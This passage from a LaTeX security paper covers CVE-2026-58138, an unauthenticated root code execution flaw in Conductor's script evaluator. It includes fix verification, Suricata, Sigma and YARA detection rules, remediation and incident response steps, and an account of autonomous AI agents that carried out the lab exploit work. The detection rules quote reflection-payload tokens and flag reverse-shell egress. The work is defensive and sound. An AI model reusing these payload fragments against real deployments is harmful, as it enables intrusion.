version field. The stock arm was fired by the unmodified CLI tool, and the
patched arm by a harness importing the tool's own builders, with the tool
never modified. Table~\ref{tab:closure} is the closure matrix.


\begin{table}[t]
\centering
\caption{Closure matrix, same day, same payload bytes. The first divergence
is the sink evaluation, not an auth wall or a transport failure.}
\label{tab:closure}
\footnotesize
\begin{tabular}{@{}p{1.35cm}p{3.0cm}p{3.3cm}@{}}
\toprule
Step & Stock 3.22.3 & Patched 3.30.2 \\
\midrule
register & 200, register 2 to 5 ms & 200, register 189 ms \\
start & 200 with workflow id & 200 with workflow id \\
sink exec & COMPLETED, \texttt{uid=0(root)} stdout returned &
FAILED\allowbreak\_WITH\allowbreak\_TERMINAL\allowbreak\_ERROR:
\texttt{Unknown identifier: getMethod} \\
marker & written \texttt{root root}, readback OK & absent before and after,
\texttt{/tmp} listing byte-identical \\
process walk & not frozen at connect (see \S\ref{sec:shellevid}) & no
spawned shell in \texttt{/proc} walk \\
\bottomrule
\end{tabular}
\end{table}

The denial text matters more than the failure. The patched task dies at the
expression's first host hop with \texttt{TypeError: invokeMember (getMethod)
on java.lang.Class failed due to: Unknown identifier: getMethod}, thrown by
\texttt{ScriptEvaluator.handlePolyglotException} inside the 3.30.2 jar. That
binds the denial to this payload rather than to a general outage. Two
anti-vacuity controls close the argument. A benign INLINE expression
(\texttt{1+1}) through the same patched sink completes with result 2, so the
engine is alive and the path is open. A same-day positive control fires the
unmodified tool on the stock arm with \texttt{PROOF-MARKER-WRITTEN} back on
stdout. Five verification pillars (monitor alive, witnessed inert, unit
corroboration, positive control, config-diff scope) are each marked proven in
the case evidence file with their artifact paths.

\subsection{Honest deviations}

Three, stated plainly. The patched arm's per-id read lagged about 21 s
(embedded-database read load) while the server-side watcher timestamped the
terminal state at +1 s, and both numbers ship in the evidence. The patched
instance delete returned 200 while stock returns 409, a release drift with no
residue either way. The byte-comparison scope is honest too, the two images
differ by a whole release train rather than one commit, so the fix is
localized by runtime denial behavior plus vendor source diff, and a bisect
across the train was out of scope, while the nginx
config of the two images is byte-identical and the shipped-config diff is one
comment line.
% =============================================================================
\section{Detection}
\label{sec:detection}

\subsection{Set and evidence base}

All rules were written only from traffic we captured ourselves on the stock
arm (8 pcaps, attack windows for the three rungs plus benign controls and a
deliberate sink-error window). The set ships 8 suricata rules (SIDs
2026581381 to 2026581388),
% claim: suricata-rule-count
2 sigma rules,
% claim: sigma-rule-count (parent-adjudicated: stated_in paper/main.tex, gate passes)
and 5 yara rules over workflow-definition JSON, wire fragments, and PoC-tool
identity.
% claim: yara-rule-count
Table~\ref{tab:detect} summarizes the family. Validation is counted rather
than asserted. \texttt{suricata -T} loads all rules with 0 failures, every
pcap was replayed under a replay-only harness, and the harness exits non-zero
if any rule fires on a benign capture (it did not).

\begin{table}[t]
\centering
\caption{Detection families and live-fire results (per-rule matrices in the
case evidence). Suricata, all SIDs positive on attack captures and 0 on both
benign pcaps. Sigma, CVE-name rule 139 matches across the 3 attack windows
and 0 on negatives (line matcher mirroring sigma semantics, labeled as such
in every fire log). YARA, strongest rule 9 of 10 positive artifacts, all 10
covered as a set, and 0 on benign
controls.}
\label{tab:detect}
\footnotesize
\begin{tabular}{@{}p{1.7cm}p{1.55cm}p{4.3cm}@{}}
\toprule
Family & Count & Fires / no-fires \\
\midrule
Suricata & 8 wire rules & SIDs 81/82 register bootstrap keys, 83 CVE-named
start, 84/85/86 shell egress on 4444, 87/88 defacement \\
Sigma & 2 log rules & CVE-named metadata errors 139/0 attack vs negative,
sink-failure rule corroboration-grade \\
YARA & 5 artifact rules & strongest rule 9/10 attack artifacts, set coverage
10/10, 0 benign controls \\
\bottomrule
\end{tabular}
\end{table}

\subsection{Representative rules}

Listing~\ref{lst:suricata} is the wire rule for the registration hop. URI and
evaluator type alone are deliberately not enough, because benign operators
legitimately register benign INLINE tasks and our benign control proves the
false positive. The rule keys on the reflection bootstrap tokens, which are
the sink weaponizer. Listing~\ref{lst:sigma} is the log-side rule that carries
attribution.

\begin{lstlisting}[style=yargen,caption={Suricata SID 2026581381 (verbatim,
long content tokens wrapped by the listing style).},label={lst:suricata}]
alert http $EXTERNAL_NET any -> $HOME_NET 8080
 (msg:"CVE-2026-58138 Conductor inline-task register with JS reflection
  bootstrap"; flow:to_server,established; content:"POST"; http_method;
  content:"/api/metadata/workflow"; http_uri;
  content:"\"evaluatorType\":\"javascript\""; content:"\"type\":\"INLINE\"";
  content:"$.getClass().getClass()"; content:"getMethod(";
  content:"'forName'"; classtype:attempted-admin; sid:2026581381; rev:1;
  metadata:cve 2026-58138;)
\end{lstlisting}

\begin{lstlisting}[style=yargen,caption={Sigma rule
\texttt{conductor\_cve\_\allowbreak named\_\allowbreak workflow\_\allowbreak metadata\_\allowbreak errors} (detection block
verbatim). Case-bound by design, it keys on the observed CVE-named workflow
artifact, which a real attacker may rename. The wire rules of
Listing~\ref{lst:suricata} do not depend on naming.},label={lst:sigma}]
detection:
  selection:
    message|contains: '/api/metadata/workflow/cve2026-58138'
  condition: selection
\end{lstlisting}

\subsection{The gap the defender must know}
\label{sec:silent}

The successful exploit is log-silent on 3.22.3. The sink raises nothing on
success and the vendor emits no per-success INFO line, verified by our attack
log windows containing zero INFO. Two consequences, measured rather than
assumed. First, the sink-failure sigma rule cannot attribute this attack. Its
positive window is a deliberate benign malformed task that produces the same
failure text (gray matrix, 5 matches there and 0 on benign controls), so it is
corroboration-grade, not attribution. Second, attribution of a successful
unauth RCE on this build rests on the wire rules (bootstrap tokens, start
trigger, shell egress on 4444, defacement literals) plus the CVE-named
artifact rule. A defender relying only on server logs will not see this
intrusion at all.

% =============================================================================
\section{Remediation and Incident Response}
\label{sec:remediation}

\subsection{Remediation}

\begin{enumerate}
\item \textbf{Upgrade to 3.30.2 or later.} The \texttt{denyAccess} rewrite is
the fix. Backports to the 3.21.x and 3.22.x lines were not found in public
searches (main-branch commits only), so remaining on an older train means the
vulnerable \texttt{HostAccess.ALL} context until a vendor-sanctioned backport
or an equivalent self-build.
\item \textbf{Authenticate the API.} The exploited precondition is the
credential-free \texttt{/api/*} surface. Whatever the version, do not expose
8080 without an authentication layer or a reverse proxy in front of it, and
never expose it publicly on the default configuration.
\item \textbf{Cut the blast radius.} The monolithic image runs JVM and nginx
as uid 0. A hardening pass (non-root user, read-only served files,
\texttt{no-new-privileges}, egress deny by default) does not fix the sink but
shrinks what container root can touch.
\item \textbf{Deploy the wire detections} of Section~\ref{sec:detection}, not
only log-side telemetry, per the silent-success finding of
Section~\ref{sec:silent}.
\end{enumerate}

\subsection{Incident response playbook}

\begin{enumerate}
\item \textbf{Triage on the wire.} On any hit in the SID block, treat the
host as compromised pending review and preserve full HTTP bodies, because the
register body is the payload.
\item \textbf{Assess.} Enumerate workflow definitions for INLINE, LAMBDA,
DO\_WHILE, and SWITCH tasks containing reflection tokens (\texttt{getClass},
\texttt{forName}, \texttt{Method}, \texttt{java.lang.Runtime}). Pull workflow
instances and task outputs, since successful tasks embed attacker-chosen
stdout in \texttt{outputData}.
\item \textbf{Hunt the consequences.} Files newly written by uid 0 (the proof
marker is one file under \texttt{/tmp/}, defacement injects an
\texttt{\textless h1\textgreater} banner at the
\texttt{\textless body\textgreater{}} anchor of \texttt{index.html} while the
SPA keeps rendering under it, and the served-page md5 of the stock image is a
cheap integrity baseline), outbound sessions to unusual ports (4444 is the PoC
listener, not a law), and unexpected process trees under the JVM.
\item \textbf{Eradicate and rebuild.} Deleting the workflow definition stops
re-execution, but completed instance rows cannot be purged via API on this
build (HTTP 409 on instance delete), and code that already ran cannot be
un-run as root. Rebuild the container from a pinned digest after upgrading,
and preserve the instance history for forensics before the rebuild resets it.
\item \textbf{Re-check the same gates that closed this case.} Version at
\texttt{/actuator/info}, a benign INLINE expression still evaluating, and the
identical PoC bytes now dying with the blocklist denial.
\end{enumerate}

% =============================================================================
\section{Ethics, Reproducibility, and the Agent Pipeline}
\label{sec:ethics}

\subsection{Disclosure posture}

No discovery claim, stated in Section~\ref{sec:intro} and repeated in the case
pack. Finder credit to seqradev per the CVE Record, advisory credit to
VulnCheck \cite{vulncheck}, fix credit to the upstream PRs
\cite{fixcommits}. The timeline anchors in Table~\ref{tab:timeline} come from
the public record with our retrieval dated 2026-09-21. We contacted no vendor,
no third party, and no system outside the lab. Nothing here requires an
embargo conversation that the public record has not already had.

\subsection{Lab-only constraints}

Every experiment obeyed four constraints. Zero-egress network by construction
(\texttt{-{}-internal} bridge, machine-verified). Fictional \texttt{*.lab}
naming. A targeting guard in the tool that structurally refuses any address
outside the lab subnet, with the patched arm and gateway refused as targets,
no bypass flag, refusal tested 18 ways offline and 3 ways live. And a restore
contract that leaves no marker, no defacement, and no workflow definition
behind after each run. The published artifacts (tool, rules, lab scripts) are
therefore safe to run as-is.

\subsection{Reproducibility}

The case pack ships the PoC tool with its offline suite (20 checks, green with
the lab down), golden wire dumps from a fixed seed with zero sockets, the live
matrix (10 checks), the A/B evidence with the byte-identity proof, the capture
pcaps with their matrices, both rule trees, and the sealed transcripts quoted
here. A claim gate script re-derives every gated number from these
artifacts at check time, so a typed number that drifts from its source fails
the build rather than shipping quietly; the remaining published counts
(the 139 sigma matches, the 371 served bytes, the 20/18/3/10 check tallies,
and the seal heads) are quoted from named artifact gate tails, each named
where it appears. Figures are generated from the case
facts by \texttt{paper/make\_figs.py}, which aborts non-zero when a label
would cross a box border. Table~\ref{tab:artifacts} maps each key number to
its source.

\begin{table}[t]
\centering
\caption{Number-to-artifact map for the headline values. The claim gate
re-derives them at check time.}
\label{tab:artifacts}
\footnotesize
\begin{tabular}{@{}p{2.75cm}p{4.9cm}@{}}
\toprule
Number & Derived from \\
\midrule
Rule counts 8/2/5 & \texttt{detection/rules/} rule files \\
Payload sha256 & \texttt{evidence/fix-verification/\allowbreak ab-evidence.json} \\
Tool sha256 head & \texttt{exploit/\allowbreak conductor\_\allowbreak cve2026-58138.py} \\
Facts sheet sha256 head & \texttt{evidence/raw-research/}\allowbreak\texttt{facts-sheet.md} (\texttt{5390da025b60de20}) \\
Arm digests & \texttt{designs/facts.json} cross-checked vs registry \\
Latencies & sealed transcripts, per-run latency log \\
\bottomrule
\end{tabular}
\end{table}
% claim: facts-sheet-sha (value 5390da025b60de20 above)

\subsection{The agent pipeline}

The full lifecycle (research, lab build, exploit engineering, fix
verification, detection engineering, this paper, and the companion film) was
executed by a crew of autonomous AI agents under a parent orchestrator, with
one writer per file, append-only attempt and gate ledgers, and a parent that
re-runs every counted gate before approving a wave. Prior work on LLM
penetration agents documents that long-horizon coherence is the fragile part
\cite{wang2025checkmate}. The countermeasures that mattered here were
structural. Gates re-derive rather than trust transcripts. The claim plan is
read-only for the writer. Invalid attempts stay in the record, and here that
is not rhetoric, 5 of the 6 logged attempts were wrong (the first a
request-schema error, not a payload attempt). The
pipeline's failures were visible in the attempt log before they were visible
in any output, which is the property one would want from a human team too. The
paper closes against raw takes and sealed transcripts, never against the
edited cut.

\subsection{Limitations}

\begin{itemize}
\item The RCE is container root. No host escape was attempted or established,
and no claim in this paper depends on one.
\item The A/B compares release trains (3.22.3 versus 3.30.2) rather than one
commit, per the fixed two-arm design. Denial behavior plus vendor source diff
localize the fix, and a bisect across the train was out of scope.
\item The successful-exploit log silence was measured on the stock image's
default logging. Different logging configuration or a different deployment
shape (external database, distributed topology, authentication in front) may
observe more, and we did not test those shapes.
\item The sigma rules partially key on case-bound PoC naming, stated in the
rule text and here.
\item Latencies (register at most 9.8 ms, sink execution 18.7 to 48.5 ms
across the 18 recorded runs) are
single-container SQLite numbers, not production figures.
\item The victim-console stills (Figures~\ref{fig:still3}
and~\ref{fig:still3b}) come from a later read-only browsing session of the
inert instance history, not from the main take's camera script: the take's
browser never navigated past the UI root. The frames are labeled with their
source capture, and the session issued GETs only.
\end{itemize}

% =============================================================================
\section{Conclusion}
\label{sec:conclusion}

CVE-2026-58138 was disclosed, credited, and fixed in public before this paper
existed, and the paper says so in its first lines. What the public record
still lacked was the evidence layer, and that is what closes here, 5 gaps, 5
deliverables. One unauthenticated registration and one unauthenticated start
turn the vendor's own script evaluator into root inside the container, visible
in the victim's console and on the wire, reproducible from pinned digests in a
zero-egress lab. The vendor fix was verified non-vacuously on identical
payload bytes, with the patched sink still computing \texttt{1+1} while the
payload dies at its first host hop. The operational finding that matters most
for defense is the detection gap, because success is log-silent, defense has
to live on the wire. Every gated number in the paper re-derives from a shipped
artifact at gate time, the remaining counts are quoted from the artifact tails
named at their use sites, and the pipeline that produced it is reported with its
five invalid attempts in plain sight. What closes, in count: three boundary
statements honored (zero egress, fictional \texttt{*.lab} naming, container
root with no host-escape claim); five gaps answered by five evidence
deliverables (chain, shell, A/B, detections, pipeline report); seventeen gated
claims green at gate time.

{\small
\begin{thebibliography}{9}
\bibitem{cverecord}
CVE Record, \textit{CVE-2026-58138}, status updated 2026-07-14. [Online].
Available: \url{https://www.cve.org/CVERecord?id=CVE-2026-58138}
\bibitem{vulncheck}
VulnCheck, \textit{Orkes Conductor 3.21.21 \textless{} 3.30.2
Unauthenticated RCE via GraalVM Script Evaluators}, advisory, 2026-06-30.
[Online]. Available: \url{https://www.vulncheck.com/advisories/} (orkes
conductor GraalVM script evaluators advisory page)
\bibitem{ghsa}
GitHub Advisory \textit{GHSA-7x5q-8f6h-rjrc}, published 2026-06-30. [Online].
Available: \url{https://github.com/conductor-oss/conductor/} (security
advisories)
\bibitem{fixcommits}
conductor-oss/conductor, fix commits \texttt{87a7d96aabbb} (PR \#1057,
2026-05-05) and \texttt{c691e35e768c} (PR \#1123, 2026-05-22). [Online].
Available:
\url{https://github.com/conductor-oss/conductor/commit/87a7d96aabbb} and
\url{https://github.com/conductor-oss/conductor/commit/c691e35e768c}
\bibitem{publicpoc}
Community PoC repository \textit{BiiTts/CVE-2026-58138-Conductor-Unauth-RCE},
created 2026-06-30. [Online]. Available:
\url{https://github.com/BiiTts/} (CVE-2026-58138 Conductor unauth RCE repo)
\bibitem{itw}
Trade-press summary of Empirical Security and Fortinet in-the-wild reporting
(observations from 2026-08-21, attempt volume reported 2026-09-08 and
2026-09-09), articles of 2026-09-18. [Online]. Available:
\url{https://securityweek.com/}
\bibitem{wang2025checkmate}
L.~Wang, X.~Shi, Z.~Li, Y.~Jiang, S.~Tan, Y.~Jiang, J.~Cheng, W.~Chen,
X.~Shen, Z.~Li, and Y.~Chen, \textit{Automated Penetration Testing with LLM
Agents and Classical Planning} (CHECKMATE), arXiv:2512.11143 [cs.CR], 2025.
[Online]. Available: \url{https://arxiv.org/abs/2512.11143}
\end{thebibliography}
}

\end{document}
